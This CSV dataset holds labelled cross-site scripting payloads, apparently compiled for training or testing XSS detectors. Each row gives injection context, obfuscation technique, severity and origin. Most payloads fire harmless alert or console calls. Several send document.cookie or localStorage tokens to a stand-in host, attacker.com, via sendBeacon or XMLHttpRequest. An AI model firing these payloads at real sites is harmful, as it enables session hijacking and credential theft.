payload,context,technique,severity,length,source
`><img src=x onpoint&#101;rmov&#101;=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,67,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,low,180,synthetic
"<hgroup onmousemove=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,53,real
<ins onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,65,real
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>,dom_sink,url_encoding,high,84,real
ondrop=\u0061lert/***/(document.domain),event_handler,synthetic,low,39,synthetic
OnaNimAtiOneNd=ConSolE.lOg&#40;'XSS'&#41;,event_handler,synthetic,low,41,synthetic
{{confirm 'XSS'}},template_injection,synthetic,low,17,synthetic
"<a2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a2>",tag_injection,none,medium,77,real
"LocAtiOn=""jaVasCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))""",dom_sink,synthetic,high,60,synthetic
%3C!--%3E%3Ctemplate onended=prompt('XSS')%3E,tag_injection,synthetic,medium,45,synthetic
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,tag_injection,none,medium,77,real
"%3Cmarquee src=x onclose=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,66,synthetic
<object x=y onvolumechange=alert(1)>,tag_injection,synthetic,medium,36,synthetic
"<video draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,68,real
<textarea onscrollend=alert('XSS') onscrollend=alert('XSS')>,tag_injection,synthetic,medium,60,synthetic
"<abbr onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,61,real
"%22 ><svg onended=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
"<label draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,66,real
\' OnlOad=alErt(1)//,attribute_escape,synthetic,medium,20,synthetic
%3Cxss onkeypress=console.log(1)/%3E,tag_injection,synthetic,medium,36,synthetic
{{constructor['constructor']('prompt(document.cookie)')()}},template_injection,synthetic,high,59,synthetic
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<!-- injection --><svg height=""50px"">",attribute_escape,comment_injection,low,37,real
"<m&#97;th
onpl&#97;ying=consol&#101;.log('XSS')>",tag_injection,synthetic,low,48,synthetic
"""><Img srC=x onDroP=cOnfIrm(loCatIon.haSh)>",attribute_escape,synthetic,medium,43,synthetic
%3Cselect x=y onanimationstart=prompt('XSS')%3E,tag_injection,synthetic,medium,47,synthetic
"<caption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,73,real
"location=""javascript:XMLHttpRequest(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,67,synthetic
"""><Img srC=x onPagEhiDe=ConSolE.lOg(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,53,synthetic
`><Img srC=x onProMptDisMisS=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,52,synthetic
"""><img src=x onanimationend=confirm(document.domain)>",attribute_escape,synthetic,medium,53,synthetic
%27><img src=x onbeforecut=confirm(1)>,attribute_escape,synthetic,medium,38,synthetic
\' ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,medium,54,synthetic
"<picture onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",tag_injection,none,medium,73,real
'><script>console.log(1)</script>,script_injection,synthetic,medium,33,synthetic
<animatetransform onpointermove=console.log('XSS')/>,tag_injection,synthetic,medium,52,synthetic
<!--><animatemotion ondblclick=console.log(1)>,tag_injection,synthetic,medium,46,synthetic
""" %3E%3Csvg onwebkitfullscreenchange=console.log(document.domain)%3E",attribute_escape,synthetic,medium,68,synthetic
location=%22javascript:eval(location.hash)%22,dom_sink,synthetic,high,45,synthetic
"<p v-show=""_c.constructor`alert(1)`()"">",attribute_escape,none,medium,39,real
&quot; onbeforematch=alert('XSS') x=&quot;,attribute_escape,synthetic,medium,42,synthetic
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",js_uri,none,medium,87,real
"setTimeout(""XMLHttpRequest('//attacker.com/?c='+document.cookie)"",0)",dom_sink,synthetic,high,68,synthetic
"&quot; onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,medium,86,synthetic
"<nextid onmousedown=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,53,real
%3Cscript	%3Econsole.log('XSS')%3C/script%3E,script_injection,synthetic,medium,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",tag_injection,none,medium,113,real
javascript:console.log/***/('XSS'),js_uri,synthetic,low,34,synthetic
"<abbr oncut=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",tag_injection,none,medium,59,real
onstalled=javascript:console.log(1),event_handler,synthetic,medium,35,synthetic
'%3E%3Cimg src=x onpageshow=console.log(location.hash)%3E,attribute_escape,synthetic,medium,57,synthetic
\%27 onanimationend=confirm(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
'><img src=x onpageswap=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
"<object draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</object>",tag_injection,none,medium,90,real
<marquee	onpopstate=\u0061lert('XSS')>,tag_injection,synthetic,low,38,synthetic
"<style>@keyframes x{}</style><i style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></i>",tag_injection,none,medium,95,real
	onSubMit=coNfiRm(1),event_handler,synthetic,medium,20,synthetic
<animatemotion ongesturestart=confirm(1)>,tag_injection,synthetic,medium,41,synthetic
<table oncopy=confirm(%27XSS%27) oncopy=confirm(%27XSS%27)>,tag_injection,synthetic,medium,59,synthetic
"<tr onmouseenter=""alert(1)"">AnonKryptiQuz</tr>",tag_injection,none,medium,46,real
"""><img src=x onchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
'%3E%3Cimg src=x onpagereveal=console.log(1)%3E,attribute_escape,synthetic,medium,47,synthetic
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>,tag_injection,none,medium,55,real
"<baSe
OnpAgeSwaP=aLerT('XSS')>",tag_injection,synthetic,medium,30,synthetic
"<var onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</var>",tag_injection,none,medium,63,real
<video	onclick=console.log('XSS')>,tag_injection,synthetic,medium,34,synthetic
\' onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,low,76,synthetic
%27 ><svg onbegin=confirm(1)>,attribute_escape,synthetic,medium,29,synthetic
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,62,real
"ondrop=javascript:confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,56,synthetic
%22><img src=x onpromptdismiss=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,54,synthetic
<input4 onpointerout=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,72,real
OniNpuT=aLerT/***/(loCatIon.haSh),event_handler,synthetic,low,33,synthetic
""" %3E%3Csvg onpointerrawupdate=prompt('XSS')%3E",attribute_escape,synthetic,medium,47,synthetic
<script>prompt`location.hash`</script>,script_injection,synthetic,low,38,synthetic
 onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,47,synthetic
"<marquee id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></marquee>",tag_injection,none,medium,90,real
"<style>:target {color: red;}</style><custom tags id=x style=""transition:color 10s"" ontransitioncancel=print()></custom tags>",tag_injection,none,low,124,real
<D3/OnMouSEenTer=[2].find(confirm)>z,tag_injection,case_variation,low,36,real
%3Cscript%3Econfirm(document.domain)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
"%27><img src=x ontouchstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
""" oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83)) aUtoFocUs=""",attribute_escape,synthetic,high,58,synthetic
<textarea onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"setTimeout(""fetch(document.cookie)"",0)",dom_sink,synthetic,high,38,synthetic
<&#97;r&#101;&#97; x=y onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,77,synthetic
"__proto__[""onc&#97;npl&#97;y""]=&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,82,synthetic
onrepeat=\u0061lert(location.hash),event_handler,synthetic,low,34,synthetic
"<style>:target {color:red;}</style><a2 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></a2>",tag_injection,none,medium,108,real
""" %3E%3Csvg onpointerover=console.log('XSS')%3E",attribute_escape,synthetic,medium,47,synthetic
onkeydown=console.log&#40;document.domain&#41;,event_handler,synthetic,low,46,synthetic
`%3E%3Cimg src=x oninput=confirm(1)%3E,attribute_escape,synthetic,medium,38,synthetic
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionstart=alert(1)></section>",tag_injection,none,medium,114,real
"""><img src=x ontouchend=console.log(1)>",attribute_escape,synthetic,medium,39,synthetic
"window[%22alert%22](navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,79,synthetic
"__proto__[""on&#97;nim&#97;tionit&#101;r&#97;tion""]=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,low,126,synthetic
&quot; ongestureend=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,42,synthetic
<button popovertarget=x>Click me</button><tfoot ontoggle=alert(1) popover id=x>AnonKryptiQuz</tfoot>,tag_injection,none,medium,100,real
"<iframe2 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",tag_injection,none,medium,75,real
'><img src=x ons&#101;curitypolicyviol&#97;tion=prompt(1)>,attribute_escape,synthetic,medium,58,synthetic
"<data onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</data>",tag_injection,none,medium,84,real
"	oninput=alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,45,synthetic
' ><svG oNtrAnsItiOnrUn=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,43,synthetic
"%22 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
"%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",js_uri,url_encoding,low,101,real
onpointerrawupdate=console.log/***/(location.hash),event_handler,synthetic,low,50,synthetic
\' onmousedown=\u0061lert(location.hash)//,attribute_escape,synthetic,low,42,synthetic
' ><svg onclos&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,62,synthetic
`%3E%3Cimg src=x ontouchend=console.log('XSS')%3E,attribute_escape,synthetic,medium,49,synthetic
"<thead onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,83,real
"<dialog onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,74,real
"s&#101;tInt&#101;rv&#97;l(""f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",100)",dom_sink,synthetic,low,102,synthetic
"\"" onscrollend=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
"<tfoot draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",tag_injection,none,medium,87,real
"\"" ong&#101;stur&#101;&#101;nd=consol&#101;.log('XSS')//",attribute_escape,synthetic,low,56,synthetic
'><img src=x onblur=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,63,synthetic
on&#101;rror=consol&#101;.log/*x*/('XSS'),event_handler,synthetic,low,41,synthetic
"<samp draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,85,real
"<caption draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</caption>",tag_injection,none,medium,67,real
<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(1)”>,tag_injection,url_encoding,low,73,real
""" ontouchmov&#101;=confirm('XSS') """,attribute_escape,synthetic,medium,35,synthetic
<input4 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,74,real
<dialog src=x onstalled=confirm('XSS')>,tag_injection,synthetic,medium,39,synthetic
"<article oncut=""alert(1)"" contenteditable>AnonKryptiQuz</article>",tag_injection,none,medium,65,real
oncontextmenu=alert&#40;%27XSS%27&#41;,event_handler,synthetic,low,38,synthetic
"location=""javascr	ipt:alert(location.hash)""",dom_sink,synthetic,high,43,synthetic
""" ><svg onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>",attribute_escape,synthetic,medium,71,synthetic
"""><t&#101;xt&#97;r&#101;&#97; onscroll&#101;nd=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,low,69,synthetic
"<applet ondblclick=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,52,real
<BODY ONLOAD=alert(�AnonKryptiQuz�)>,tag_injection,case_variation,medium,36,real
<button onclick=console.log(1)/>,tag_injection,synthetic,medium,32,synthetic
"' ><svg onpromptaction=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
""" ontoggle=console.log('XSS') """,attribute_escape,synthetic,medium,31,synthetic
"\"" onpagereveal=console.log(document.domain)//",attribute_escape,synthetic,medium,46,synthetic
<xss src=x onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection,synthetic,low,57,synthetic
"__pRotO__[""oNmoUseUp""]=cOnfIrm(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink,synthetic,high,86,synthetic
<multicol onpointerout=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,76,real
"<a href=""\xC2\xA0javascript:javascript:alert(2762)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,78,real
<foRm OnpAgeHidE=cOnfIrm(1)/>,tag_injection,synthetic,medium,29,synthetic
'%3E%3Cimg src=x onbeforetoggle=console.log('XSS')%3E,attribute_escape,synthetic,medium,53,synthetic
<button popovertarget=x>Click me</button><set ontoggle=alert(1) popover id=x>AnonKryptiQuz</set>,tag_injection,none,medium,96,real
"\"" OnmOusEup=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,52,synthetic
"'><img src=x on&#97;nim&#97;tion&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,89,synthetic
"<slot onmouseover=""alert(1)"">AnonKryptiQuz</slot>",tag_injection,none,medium,49,real
<link	onw&#97;iting=confirm(1)>,tag_injection,synthetic,medium,31,synthetic
""" ><svg onscrollsnapchange=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
<viDeo/onCliCk=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,34,synthetic
JavAscRipT:vOid(alErt('XSS')),js_uri,synthetic,medium,29,synthetic
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>",tag_injection,none,medium,99,real
#alErt('XSS'),template_injection,synthetic,medium,13,synthetic
<listing onpointerout=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,74,real
"<progress onclick=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,73,real
"<rtc draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,64,real
<t&#101;mpl&#97;t&#101; src=x onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,86,synthetic
""" ><svg ong&#101;stur&#101;&#101;nd=prompt(1)>",attribute_escape,synthetic,medium,46,synthetic
%27><img src=x ontouchend=alert(%27XSS%27)>,attribute_escape,synthetic,medium,43,synthetic
<scr	ipt	>confirm(document.domain)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
${{\u0061lert(1)}},template_injection,synthetic,low,18,synthetic
""" %3E%3Csvg onmouseover=prompt(document.domain)%3E",attribute_escape,synthetic,medium,50,synthetic
"<dialog onmouseout=""alert(1)"">AnonKryptiQuz</dialog>",tag_injection,none,medium,52,real
""" ><svG oNdrOp=ConFirM(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,38,synthetic
"<ul draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</ul>",tag_injection,none,medium,62,real
"EvaL(""ConFirM(lOcaLStOraGe.GetIteM('TokEn'))"")",dom_sink,synthetic,high,46,synthetic
"\"" onfocus=&#97;l&#101;rt(1)//",attribute_escape,synthetic,low,30,synthetic
<</script/script><script ~~~>\u0061lert(1)</script ~~~>,script_injection,unicode_escape,low,55,real
"&quOt; onRepEat=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape,synthetic,high,63,synthetic
[a](j a v a s c r i p t:prompt(document.cookie)),dom_sink,none,high,48,real
""" ><svg onk&#101;ydown=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,61,synthetic
<plAinTexT sRc=X oNtoUchStaRt=AleRt(1)>,tag_injection,synthetic,medium,39,synthetic
""" ><svg onb&#101;for&#101;p&#97;st&#101;=prompt(1)>",attribute_escape,synthetic,medium,51,synthetic
"' %3E%3Csvg onanimationend=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></main>",tag_injection,none,medium,112,real
<area onpointerout=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,68,real
onr&#101;s&#101;t=prompt(1),event_handler,synthetic,medium,27,synthetic
javascript:confirm/**/(1),js_uri,synthetic,low,25,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,75,synthetic
'><img src=x ontransitionend=alert(1)>,attribute_escape,synthetic,medium,38,synthetic
""" ><svg onpagehide=alert(document.domain)>",attribute_escape,synthetic,medium,42,synthetic
onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt/*x*/('XSS'),event_handler,synthetic,low,52,synthetic
%3Cmtext x=y onended=confirm(document.domain)%3E,tag_injection,synthetic,medium,48,synthetic
"<video draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,87,real
"document.body.innerHTML=%22<img src=x onerror=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22",dom_sink,synthetic,high,116,synthetic
"setInterval(""alert('XSS')"",100)",dom_sink,synthetic,high,31,synthetic
"WinDow[""fEtcH""](btOa(DocUmeNt.CooKie))",dom_sink,synthetic,high,38,synthetic
